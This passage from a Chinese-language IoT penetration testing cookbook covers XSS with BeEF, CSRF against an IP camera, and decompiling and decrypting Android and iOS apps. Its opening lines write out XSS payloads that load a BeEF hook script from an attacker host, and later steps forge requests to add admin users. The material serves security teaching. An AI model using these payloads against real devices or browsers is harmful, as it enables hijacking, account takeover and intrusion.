http://192.168.1.1/start_apply.htm?next_page= '+<script src=//172.16.100.139:3000/hook.js></script>+' 
```

1.  使用这个`GET`请求，我们可以看到浏览器响应一个损坏的页面，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8f20f997-5804-4dfb-8490-e2bd459956a4.png)

1.  再次，我们正在破坏一些 JavaScript 代码，阻止浏览器执行我们在 BeEF 服务器上托管的外部 JavaScript 代码。很可能我们需要终止预期的 JavaScript 代码，并开始我们自己的`<script>`标签，以请求我们的外部 JavaScript BeEF。我们可以尝试添加一个带有打开和关闭脚本标签括号的参数，添加引号，然后尝试使用以下`GET`请求调用我们的 BeEF 钩有效负载：

```
http://192.168.1.1/start_apply.htm?next_page=param<script></script>+"<script src=http://172.16.100.139:3000/hook.js></script>
```

1.  当我们发送`GET`请求并查看浏览器响应时，似乎输出相同的破损 JavaScript；但是，如果我们查看 ZAP，我们可以看到浏览器向我们的 BeEF 服务器发送请求：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0e4d47ed-73f8-4246-99b6-18f7b14c7bd3.png)

1.  以下是 ZAP 历史选项卡中显示的 BeEF 钩请求：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/874c69c1-28ec-4c5c-af61-0a06d6c75255.png)

1.  从 BeEF 服务器，我们已成功用我们的有效负载钩住了我们的浏览器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/84dc7381-1e28-4346-9c3b-8513ab31358e.png)

# 钩住受害者时 BeEF 的基本使用

以下是钩住受害者时 BeEF 的基本使用：

1.  一旦受害者被钩住，BeEF 会快速枚举运行在受害者计算机上的信息。

以下屏幕截图说明了 BeEF 捕获的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7e372f36-35c1-4f4f-a1ac-6c5f376f7f63.png)

1.  除了主机详细信息，BeEF 还使用许多利用模块在受害者身上使用，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/95723930-53b5-44b3-afb0-5afec8d5fbdb.png)

1.  网络类别中的一个模块可以扫描受害者的端口以进行后期利用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e7308456-d9aa-4794-a8d9-28e5bafa6e1a.png)

# 通过受害者的浏览器代理流量

BeEF 的我最喜欢的功能之一是能够使用受害者作为代理，代表用户发送伪造请求：

1.  这就像右键单击被钩住的受害者以用作代理一样简单，导航到 Rider 选项卡，并使用 Forge Request 选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/22b6a1a5-8afd-4e62-824b-a593a1dfbc9d.png)

1.  复制已知的`HTTP`请求，通过受害者的浏览器伪造，例如创建或更改管理员用户的密码，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/75c54380-421e-4c78-a096-3434c0eb51c6.png)

1.  在历史选项卡中查看伪造的响应：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/85c6f421-d3d9-405d-9bc9-fa9d95d49a18.png)

1.  当伪造的请求被双击时，将打开另一个选项卡，显示伪造请求的路径和`HTTP`响应，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/535439ce-c485-47cc-9bb0-5458a79d1cf0.png)

在这个示例中，我们演示了如何发现易受攻击的 XSS 参数，审查编码考虑因素，解剖 JavaScript 代码，讨论了基本 XSS 有效负载的使用，并利用了 BeEF 钩的跨站脚本漏洞。当 BeEF 钩住受害者时，有许多可能性和利用技术可供使用。

# 还有更多...

有关 BeEF 模块和高级功能的详细信息，请访问 BeEF 的 GitHub 维基页面，网址为[`github.com/beefproject/beef/wiki`](https://github.com/beefproject/beef/wiki)。

# 另请参阅

+   在尝试利用 XSS 时有许多注意事项，超出了基本的警报框。经常需要调整编码以逃避过滤器或由于字符限制而最小化有效负载。有关逃避过滤器和 XSS 的一般帮助，请查看 OWASP 的 XSS 维基页面，网址为[`www.owasp.org/index.php/Cross-site_Scripting_(XSS)`](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))。XSS 维基页面还链接到几个 XSS 测试指南文件，例如逃避过滤器。

# 利用 CSRF

CSRF 是一种攻击，它欺骗受害者以受害者的身份和权限提交恶意请求，以代表受害者执行不需要的功能。对于大多数应用程序，浏览器将自动包括任何相关的会话信息，如用户的会话 cookie、令牌、IP 地址，有时还包括 Windows 域凭据 NTLM 哈希。如果受害者用户当前已经在站点上进行了身份验证，站点将无法区分受害者发送的伪造请求和受害者发送的合法请求。

CSRF 攻击针对引起服务器状态更改的应用功能，例如更改受害者的电子邮件地址、密码或各种其他应用程序配置设置。如果攻击成功，对手不会收到响应，只有受害者会收到。因此，CSRF 攻击针对以自动方式执行的更改状态的配置请求。由于嵌入式物联网设备由于硬件计算复杂性而容易受到 CSRF 攻击的影响。尽管有预防性设计模式，不需要服务器端状态，而是应用程序验证 HTTP 引用者和来源标头，但这些并不是有效的解决方案。

CSRF 攻击已经被用于针对物联网设备和 SOHO 路由器的恶意软件，以将受害者的流量重定向到攻击者控制的 DNS 服务器，用于控制互联网流量以及进行 DDoS 攻击。其中一些恶意软件分别称为 SOHO Pharming（[`www.team-cymru.com/ReadingRoom/Whitepapers/2013/TeamCymruSOHOPharming.pdf`](https://www.team-cymru.com/ReadingRoom/Whitepapers/2013/TeamCymruSOHOPharming.pdf)）和 DNSChanger（[`www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices`](https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices)）。在本教程中，我们将演示如何在目标设备上利用 CSRF。

# 准备工作

为了利用 CSRF，我们将使用 Burp Suite 和易受攻击的 IHOMECAM ICAM-608 IP 摄像头。

# 如何做...

我们发现应用程序是否容易受到 CSRF 攻击的第一步是观察请求参数和 HTML 表单值，这些值会改变应用程序的状态。如果每个参数都没有发送一个随机令牌，或者 HTML 表单中没有硬编码的令牌，那么应用程序很可能容易受到 CSRF 攻击。我们要么改变对我们作为攻击者有利的敏感配置，要么对设备进行持久化，比如添加用户。

1.  让我们看一下目标 IP 摄像头的用户设置配置页面及其源代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f3984ef0-4e53-46a7-942a-412868599cce.png)

1.  用户设置页面的源代码看起来似乎没有包含反 CSRF 令牌，并且盲目地将参数输入到页面的 URL 中而没有任何验证：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/1395fc52-c7e4-445a-8165-f89f2ea70382.png)

我们现在可以创建一个**概念验证**（**PoC**）CSRF HTML 页面，代表受害者创建三个用户。

1.  首先，我们需要右键单击易受攻击的 HTTP 请求，然后选择生成 CSRF PoC：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/601612c0-ec5c-44db-9a52-01dff3d5937d.png)

1.  Burp Suite 创建了一个我们可以武装并根据需要调整的 PoC HTML 页面。我们的下一步是更改管理员用户设置，并通过硬编码输入值添加两个新用户。在下面的截图中，我们添加了`IoTCookbookUserAdmin`，`IoTCookbookUser1`和`IoTCookbookUser2`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e9caa619-1b80-42e5-85c0-2db77dcf97da.png)

1.  在浏览器中选择测试，弹出以下框：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e3770d3b-7f60-4550-8c1a-60eeadb1f90c.png)

1.  将链接复制到浏览器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a59cd1cc-5f91-49d1-80aa-7a366df75908.png)

1.  一旦在浏览器中运行链接，请观察发送到 Burp Suite 代理 HTTP 历史记录的请求，其中包含我们在 PoC HTML 页面中使用的硬编码输入值，用于将用户添加到 IP 摄像机：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/fdd8e5e9-480f-483f-8757-e04d1457bcb8.png)

1.  刷新 IP 摄像机的用户设置页面以查看所做的更改：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d4a50a84-d353-451f-a126-1c72ff833d81.png)

当发送 CSRF PoC 页面给受害者时，可以利用类似的策略和技术，基于上述恶意软件。管理员和用户帐户将以自动化方式创建，允许攻击者代表受害者用户进行未经授权的更改。

# 另请参阅

+   有关审查代码以查找和防止 CSRF 漏洞的额外指导，请参考 OWASP 的 CSRF 维基页面[`www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)`](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))。


# 第五章：利用物联网移动应用程序

在本章中，我们将介绍以下内容：

+   获取物联网移动应用程序

+   反编译 Android 应用程序

+   解密 iOS 应用程序

+   使用 MobSF 进行静态分析

+   使用 idb 分析 iOS 数据存储

+   分析 Android 数据存储

+   执行动态分析测试

在消费者和一些商业的物联网设备中，通常会配备一个移动应用程序来实现某种目的。例如，移动应用程序可能会向车队管理基础设施的服务器报告分析数据，或者该应用程序可能被授予委托控制启动汽车发动机。在每种情况下，数据很可能存储在移动应用程序中，并且可以被操纵以执行意外的操作。为了开始发现漏洞并逆向工程移动应用程序，可以将第三章中讨论的类似方法应用于移动空间。首先必须获取应用程序；之后，可以对应用程序进行静态分析、动态分析，并在适用的情况下重新打包。本章将帮助评估物联网移动应用程序，以便利用在该领域发现的常见漏洞。

# 介绍

在移动应用程序安全测试中，有一个四阶段的方法论，可以按以下方式分类：

+   **应用程序映射**：应用程序映射涉及应用程序的逻辑和业务功能。将应用程序映射视为收集有关应用程序的信息，以便在下一阶段使用。

+   **客户端攻击**：客户端攻击涉及存储在应用程序中的数据以及如何从客户端进行操纵。

+   **网络攻击**：网络攻击涉及网络层的问题，如 SSL/TLS 或 XMPP 协议数据。

+   **服务器攻击**：服务器攻击适用于 API 漏洞和后端服务器配置错误，这些问题是由 API 测试揭示的。

如果通过白盒或黑盒视角进行测试，这种方法可能会有所不同。从白盒和黑盒测试视角都相关的是**移动应用程序安全验证标准**（**MASVS**）。MASVS 旨在建立所需的安全要求框架，以设计、开发和测试 iOS 和 Android 移动应用程序（[`www.owasp.org/images/f/fe/MASVS_v0.9.3.pdf`](https://www.owasp.org/images/f/fe/MASVS_v0.9.3.pdf)）。此外，已经确定了影响 Android 和 iOS 应用程序的常见漏洞的趋势和模式，并将其转化为一个检查表，以配合 MASVS，测试人员和开发人员在评估应用程序时可以遵循该检查表（[`www.owasp.org/images/1/1b/Mobile_App_Security_Checklist_0.9.3.xlsx`](https://www.owasp.org/images/1/1b/Mobile_App_Security_Checklist_0.9.3.xlsx)）。该检查表还包含到 OWASP 的移动测试指南的链接，该指南仍在进行中，但已经处于成熟阶段。MASVS 和检查表指出了许多潜在的漏洞和缓解要求。物联网空间中一些最常见的漏洞包括：

+   硬编码的敏感值

+   冗长的日志记录

+   会话管理漏洞

+   敏感数据的缓存

+   不安全的数据存储

+   数据泄露

+   API 通信

这些常见的漏洞可能是由于应用程序的类型（原生或混合）而产生，但也可能是由于糟糕的编码实践引入的。在本章中，将演示许多常见漏洞在两个移动平台上的情况。虽然本书不涵盖这些方法和检查表，但在攻击物联网移动应用时，使用它们作为参考是个好主意。为了简单起见，我们将选择静态分析移动应用的路径，然后逐步向运行时动态分析移动应用。要开始，我们需要目标应用的二进制文件来开始测试物联网移动应用的过程。

虽然在本章中我们将更加强调静态和动态测试，但也有运行时分析测试，包括对目标应用进行插装和断点设置。

# 获取物联网移动应用

评估物联网设备的移动应用的第一步是获取并安装目标平台的应用。通常，如果物联网设备有一个安卓应用，也会有一个 iOS 应用。要安装安卓应用，使用 Google Play 商店，它也会分享有关应用的基本信息。对于 iOS 应用，使用苹果的 App Store 来安装应用到 iDevice。然而，原始应用程序二进制文件并不是公开的，也无法通过 Play 商店或 App Store 获得。应用程序二进制文件或包被称为安卓包或 APK，以及 iOS 的**iOS App Store Package Archive**（IPA）。如果你是从白盒的角度测试应用，这些二进制文件将会直接提供给你，无需探索获取应用程序二进制文件的方法。如果你是出于研究目的从黑盒的角度测试，你可能会想知道我们将如何获取应用程序二进制文件。

# 如何做...

在接下来的步骤中，我们将讨论获取安卓和 iOS 应用的方法。

1.  安卓有很多第三方应用商店可以用来下载 APK 文件。但是，在使用这些第三方应用商店时需要考虑一些注意事项。有时，应用商店没有更新的应用版本，或者根本就是错误的应用。在安装 Play 商店版本之前，验证应用的哈希值、版本和内容是很重要的。一些第三方应用商店声称有你要找的应用，但最终却被伪装成需要不必要权限的间谍软件应用。从第三方应用商店下载安卓应用的一个很酷的地方是能够下载应用的旧版本以及它们的历史发布说明。选择一个第三方应用商店，比如[`apps.evozi.com`](https://apps.evozi.com)和[`apkpure.com/`](https://apkpure.com/)，搜索目标安卓应用，并按照以下截图中的步骤下载 APK 文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2eb46de1-b127-4060-a5eb-c7ee9b29d7e3.png)

下一张截图显示了从[`app.evozi.com`](https://app.evozi.com)下载 Subaru 应用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d730a5cd-9ca5-4bdc-b7a5-0c8cacca4bdd.png)

1.  对于 iOS 来说，从黑盒的角度获取 IPA 文件要困难得多。与安卓相比，没有类似的第三方应用商店可供选择。这是因为苹果的 FairPlay DRM 加密了 iOS 应用。没有必要的工具，这是一个挑战。在接下来的教程中，将介绍解密 iOS 应用的步骤。如果你专注于 iOS 测试，可以直接跳到*解密 iOS 应用*的教程。

# 反编译安卓应用

有了目标 IoT 应用程序和下载的 APK 文件，现在可以对应用程序进行反编译以查看其内容。对于 Android 应用程序，这个任务可以在几分钟内完成。稍后，将更详细地介绍静态分析应用程序的自动化测试技术。反编译应用程序是逆向工程应用程序以操纵其功能的第一步。应用程序也可以在修改后重新编译和打包，但这超出了我们的范围。

# 准备工作

要反编译 Android 应用程序，我们将使用 Enjarify 和 JD-GUI。Enjarify 将 Dalvik 字节码转换为 Java 字节码，然后使用 JD-GUI 进一步分析。JD-GUI 是一个用于查看 Java 代码的 Java 反编译器。这两个工具都包含在附带的虚拟机中：

+   Enjarify 可以通过 GitHub 存储库下载：[`github.com/google/enjarify`](https://github.com/google/enjarify)。

Enjarify 确实需要 Python 3 作为依赖项。

+   JD-GUI 可以通过 GitHub 存储库获得：[`github.com/java-decompiler/jd-gui/releases`](https://github.com/java-decompiler/jd-gui/releases)。

# 如何做...

1.  首先，输入 Enjarify 文件夹路径，并将 Enjarify 指向目标 APK。在这种情况下，APK 与 Enjarify 在同一个目录中：

```
$ bash enjarify.sh com.subaru.telematics.app.remote.apk 
Using python3 as Python interpreter
1000 classes processed
2000 classes processed
Output written to com.subaru.telematics.app.remote-enjarify.jar
2813 classes translated successfully, 0 classes had errors
```

1.  打开 JD-GUI 并拖动 Enjarify 创建的 JAR 文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2a53fc0b-6e22-4dbd-aa77-6655fd55895a.png)

1.  现在可以阅读和理解 Java 类，以进行进一步的分析。例如，可以搜索使用`rawQuery`保存数据到 SQLite 的实例，以便识别 SQL 注入，如下面的屏幕截图所示。其他关键字，如`*keys*`，`execSQL`或`*password*`，也是常见的搜索词：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c2fd41df-c00f-4543-aee4-9765bc6e1bc5.png)

1.  这种技术已经被用来定位硬编码的秘密，比如嵌入在**消费电子展**（**CES**）移动应用程序中的 iBeacons 值，用于寻宝比赛（[`www.ibeacon.com/the-beacons-at-ces-were-hacked/`](http://www.ibeacon.com/the-beacons-at-ces-were-hacked/)）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f9625703-ddff-4420-9883-8de21bf07271.png)

1.  使用硬编码的信标发布在 CES 的移动应用程序中，每个人都可以玩，而不需要在拉斯维加斯。简单，对吧？拥有 Java 伪代码比阅读 smali/baksmali 代码要容易得多。如果应用程序使用了混淆形式，或者应用程序使用了 C/C++，情况可能并非总是如此，但这是特定于应用程序的。将获得对应用程序功能的额外理解，这可以通过运行时或动态分析进行测试和验证。

# 另请参阅

+   OWASP 的移动安全测试指南提供了有关反向工程 Android 应用程序和篡改技术的更多详细信息（[`github.com/OWASP/owasp-mstg/blob/master/Document/0x05b-Basic-Security_Testing.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05b-Basic-Security_Testing.md)和[`github.com/OWASP/owasp-mstg/blob/master/Document/0x05c-Reverse-Engineering-and-Tampering.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05c-Reverse-Engineering-and-Tampering.md)）。

# 解密 iOS 应用程序

由于 iOS 应用程序由苹果的 FairPlay DRM 加密，因此无法通过第三方应用商店下载未加密的版本。要查看 iOS 应用程序的内容，必须首先对其进行解密和提取。尽管可以直接从 iTunes 下载加密的 IPA 文件，但是使用 otool、lldb 和 dd 等工具手动解密应用程序是一个手动过程。幸运的是，使用一个名为 Clutch2 的工具已经自动化了这个过程。

Dumpdecrypted 是另一个工具，可以用来将解密的 iOS 应用程序转储到文件中，但本章不会使用。Dumpdecrypted 可以在存储库中找到：[`github.com/stefanesser/dumpdecrypted`](https://github.com/stefanesser/dumpdecrypted)。

# 准备工作

对于这个步骤，将使用 otool，它包含在 XCode 的命令行工具中。可以通过在 OS X 终端中执行以下命令来安装 XCode 命令行工具：

```
$ xcode-select -install

```

Clutch2 将用于解密应用程序。可以通过 GitHub 存储库[`github.com/KJCracks/Clutch`](https://github.com/KJCracks/Clutch)下载 Clutch2，也可以通过 Cydia 在越狱设备上安装 Clutch 2.0，方法是添加[`cydia.iphonecake.com`](http://cydia.iphonecake.com)作为源，并搜索 Clutch 2.0，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ace9bd7b-8fdd-442d-baa2-5b1109a7f707.png)

# 如何做到这一点...

1.  要找出应用程序是否加密，必须将 IPA 文件重命名为 ZIP 文件，并且必须在重命名的提取文件夹内找到应用程序二进制文件。例如，对应用程序二进制文件运行以下命令，而不是对 IPA 文件运行，以检查应用程序是否加密。如果`cryptid`的值为`1`，则表示应用程序已加密：

```
$ mv MySubaru.ipa MySubaru.zip
$unzip MySubaru.zip
$cd Payload/MySubaru.app/
$ otool -l MySubaru | grep -A 4 cryptid
 cryptid 1
 cryptid 1

```

现在已经确定应用程序已加密。手动解密应用程序超出了范围，但是可以利用`Clutch2`自动化应用程序解密过程。运行`Clutch2`而不带任何参数时，将列出所有已安装的应用程序：

```
# Clutch2 
Installed apps:
1:   SUBARU STARLINK <com.subaru-global.infotainment.gen2>

```

1.  接下来，使用`-d`标志和选择数字来转储要解密的应用程序。在这种情况下，要解密和转储的应用程序是编号为一的应用程序：

```
# Clutch2 -d 1
Now dumping com.subaru-global.infotainment.gen2

DEBUG | ClutchBundle.m:-[ClutchBundle prepareForDump] [Line 30] | preparing for dump
<Redacted>
DUMP | <ARMDumper: 0x14695030> armv7 <STARLINK> ASLR slide: 0x4f000
Finished dumping binary <STARLINK> armv7 with result: 1
DONE: /private/var/mobile/Documents/Dumped/com.subaru-global.infotainment.gen2-iOS6.1-(Clutch-2.0 RC4).ipa
DEBUG | FinalizeDumpOperation.m:__30-[FinalizeDumpOperation start]_block_invoke_2 [Line 60] | ending the thread bye bye
Finished dumping com.subaru-global.infotainment.gen2 in 35.2 seconds
```

1.  应用程序现在已解密。使用`scp`将解密的应用程序从 iDevice 传输到主机计算机，方法如下：

```
# scp -v '/private/var/mobile/Documents/Dumped/com.subaru-global.infotainment.gen2-iOS6.1-(Clutch-2.0 RC4).ipa' Tester@<HostIPAddress>:~/ 
```

1.  将解密后的 IPA 文件重命名为 ZIP，类似于之前练习中用来验证应用程序是否加密的步骤：

```
$ mv com.subaru-global.infotainment.gen2-iOS6.1-\(Clutch-2.0\ RC4\).ipa com.subaru-global.infotainment.gen2-iOS6.1-\(Clutch-2.0\ RC4\).zip 
Unzip the folder and a new "Payload" directory will be created.  
$ unzip com.subaru-global.infotainment.gen2-iOS6.1-\(Clutch-2.0\ RC4\).zip 
```

1.  切换到`Payload/STARLINK.app`目录，该目录包含应用程序二进制文件：

```
$ cd Payload/STARLINK.app/ 
$ ls -lah STARLINK  
-rwxrwxrwx  1 Tester  staff    30M Jun  7 17:50 STARLINK 
```

1.  可以使用诸如 Hopper 之类的工具对应用程序二进制文件的内容进行反汇编以进行进一步分析。还可以使用`class-dump`转储类信息，并通过反汇编器进行进一步分析。例如，可以通过 Hopper 执行以下屏幕截图中所示的方式来检查应用程序的`saveCredentialsToKeychain`类中存储凭据的方式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/dd3a0aad-01a7-418b-bc91-63691a2c4483.png)

通过对应用程序的类和方法有额外的了解，可以通过动态或运行时分析来操纵和测试应用程序的功能。动态测试将在本章后面进行介绍。

# 另请参阅

+   OWASP 的移动安全测试指南提供了有关转储加密 iOS 应用程序的详细信息（[`github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md)）。

# 使用 MobSF 进行静态分析

鉴于已获取了 Android 和 iOS 的应用程序二进制文件，我们可以使用自动化技术进行进一步分析。一个非常好的开源 Python 工具，可以用于 Android 和 iOS 的是**移动安全框架**（**MobSF**）。MobSF 可以为我们自动化执行多项功能和能力，特别是对于 Android 应用程序。本步骤将演示 MobSF 对 Android 和 iOS 的自动静态分析功能。静态分析通常需要访问源代码，但是反编译 Android 和 iOS 应用程序可以为我们提供接近原始源代码的伪代码形式。

# 准备工作

MobSF 包含在附带的虚拟机中，版本为 0.9.5.2 beta。MobSF 不断更新，可以通过[`github.com/MobSF/Mobile-Security-Framework-MobSF`](https://github.com/MobSF/Mobile-Security-Framework-MobSF)下载。确保已安装 MobSF 文档中列出的所有依赖项。

确保已获取目标 APK 和解密的 iOS IPA 应用程序。MobSF 不会自动解密 iOS 应用程序。MobSF 需要解密的 IPA 文件来分析应用程序，而不是应用程序 Payload 中的解密二进制文件，当将 IPA 文件重命名为 ZIP 时，MobSF 会自动执行此步骤（MobSF 是开源的，可以修改为使用原始二进制文件而不是 IPA）。Clutch2 可以在 iOS 设备上使用`-d`标志转储 IPA 文件。

# 如何做...

1.  要启动 MobSF，请在终端中运行以下命令：

```
$ python manage.py runserver

```

1.  MobSF 的 Web-UI 应该出现在您的浏览器中，地址为`127.0.0.1:8000`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/1b32c84f-ba07-4933-a4f9-43377b2b857d.png)

# Android 静态分析

1.  首先，我们将分析一个 Android 应用程序。将目标 APK 拖放到 MobSF 的 Web 界面上，MobSF 将自动反编译并分析应用程序的内容。在此界面中，列出了核心 Android 组件（活动、服务、接收器和提供者），以及有关应用程序的元数据。

MobSF 允许灵活使用不同的 Java 反编译器和 Dex 到 JAR 转换器。查看`MobSF/settings.py`配置文件，了解如何修改这些设置。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b7888a1a-ae09-4d1c-8b13-26ee0ba6e904.png)

1.  随着您向下滚动，MobSF 会分析应用程序权限、Android API 使用情况、可浏览的活动等许多其他静态分析功能，这些功能可能会有所帮助。我们将查看的区域，可能是最有帮助的，是代码分析子部分。在这里，MobSF 慷慨地标记了糟糕的编码实践以及潜在的易受攻击的代码片段：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0437d8b1-95f5-42c3-8f1d-05479667f732.png)

1.  其中一个最方便的部分是查找文件可能包含硬编码的敏感信息，如用户名、密码、密钥等。以下是 MobSF 标记的可能在应用程序中包含硬编码数据的 Java 类的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/28f49cae-7706-44ac-8f87-3c273e93a0ce.png)

1.  在移动应用程序中，很常见找到硬编码的 OAuth `client_secret`值和云提供商 API 帐户凭据。在本章的前面部分，已经给出了 CES 的硬编码 iBeacons 的类似示例。当选择其中一个标记的 Java 类时，将显示 Java 伪代码，其中演示了硬编码的值，如下截图所示：

2016 年，三星成为了在其 SmartThings 移动应用程序中硬编码他们的`client_secret`的受害者，使攻击者能够获得访问门锁的令牌。有关此事件的更多详细信息可以在以下论文中找到：

[`web.eecs.umich.edu/~earlence/assets/papers/smartthings_sp16.pdf`](https://web.eecs.umich.edu/~earlence/assets/papers/smartthings_sp16.pdf)。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8d8def19-06a8-4471-aaf5-3f040d48f0aa.png)

1.  使用 MobSF，测试 Android 应用程序变得轻而易举。另一方面，iOS 应用程序并不像 MobSF 提供的 Android 静态分析那样简单明了。

# iOS 静态分析

1.  MobSF 确实提供了有关 iOS 应用程序的静态分析的有用功能。与 Android 一样，解密后的 iOS IPA 可以拖放到 MobSF 的 Web 界面上。然后，MobSF 将 IPA 重命名为 ZIP，提取内容，分析 plist 文件，检查应用程序请求的权限，并从应用程序中转储类信息，等等。下面的截图显示了一旦解密的 iOS IPA 被拖放到 MobSF 后的着陆页面。MobSF 提供了三个主要选项，包括查看`Info.plist`、字符串和类转储：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5eb678a5-2323-450f-89d6-3d801f6ca1a8.png)

确保您在 MobSF 的设置文件`MobSF/settings.py`中调整`class-dump-z`路径，并查找`CLASSDUMPZ_BINARY`。在我的情况下，`class-dump-z`的路径是`/opt/iOSOpenDev/bin/class-dump-z`，但是使用常规的`class-dump`也应该可以，以及`/opt/iOSOpenDev/bin/class-dump`。

1.  您将要查看的第一个地方是`Info.plist`文件。`Info.plist`文件包含有关应用程序的基本信息，例如权限、IPC URL 方案和 MobSF 在其界面中提取的应用程序传输安全设置。以下截图显示了 MobSF 中的`Info.plist`文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/08df2252-fa06-40dc-aff0-fc0d95bf9a22.png)

1.  接下来，选择字符串按钮，显示二进制中的字符串，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e5fed86c-20d0-4f43-b7b0-90105c8d3fd5.png)

1.  请注意，有一个 CONSUMERSECRET 作为字符串，这也在 Android 应用程序中发现。通常，如果应用程序的一个版本包含硬编码值，另一个版本可能也包含。我们将在一会儿验证这一点，在查看 MobSF 为我们转储的类信息之后。单击“查看类转储”以列出应用程序的类详细信息。如果您已正确设置了类转储二进制设置，应该会打开一个单独的选项卡并显示类，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d494ad51-aa46-4a96-afa4-5b8cdb7cc824.png)

1.  有了可用的类细节，我们可以确定要分析的应用程序中的功能。例如，我们可以在类似 Hopper 的反汇编器中搜索要分析的类中的密码字符串。以下截图显示了正在使用的类`addBasicAuthenticationHeaderWithUsername`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/cc6d3c21-8cfb-4089-9b3d-4cc3219f1c6c.png)

1.  `addBasicAuthenticationHeaderWithUsername`可以在 Hopper 中进一步分析，查看其伪代码如下。只需在字符串选项卡中搜索类`addBasicAuthenticationHeaderWithUsername`以查看其内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c5317fd1-ab95-4ed5-9b1d-11fc19f824c9.png)

查看字符串选项卡中的类内容

1.  由于我们在 Hopper 中并且已经在之前的步骤中找到了 CONSUMERSECRET，我们可以搜索此字符串以检查它是否也在 iOS 应用程序中硬编码。以下是显示与 Android 应用程序相同的硬编码值的截图。其中一个硬编码的秘密值以 c4d5 结尾，在截图中被突出显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3ac75df2-1dfb-4481-8853-49a68f5d336c.png)

硬编码的秘密值

1.  在定位应用程序中这些硬编码值时，常见的下一步测试是通过动态分析验证它们的影响。动态分析测试将在本章后面进行介绍。

# 还有更多...

在本节中，我们涵盖了 Android 和 iOS 应用的静态分析。我们没有涵盖运行时分析测试，这需要在应用执行期间挂钩应用程序类和函数。根据您愿意在测试移动应用上花费多少时间和精力，这可能并不总是在您的范围之内。运行时分析非常适用于验证客户端安全控件，例如绕过 PIN 码锁定屏幕或暴力破解登录。OWASP 测试指南提供了 Android 和 iOS 的运行时分析技术的详细信息。访问以下链接获取更多信息：

+   **Android**: [`github.com/OWASP/owasp-mstg/blob/master/Document/0x05c-Reverse-Engineering-and-Tampering.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05c-Reverse-Engineering-and-Tampering.md)

+   **iOS**: [`github.com/OWASP/owasp-mstg/blob/master/Document/0x06c-Reverse-Engineering-and-Tampering.md`](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06c-Reverse-Engineering-and-Tampering.md)

# 使用 idb 分析 iOS 数据存储

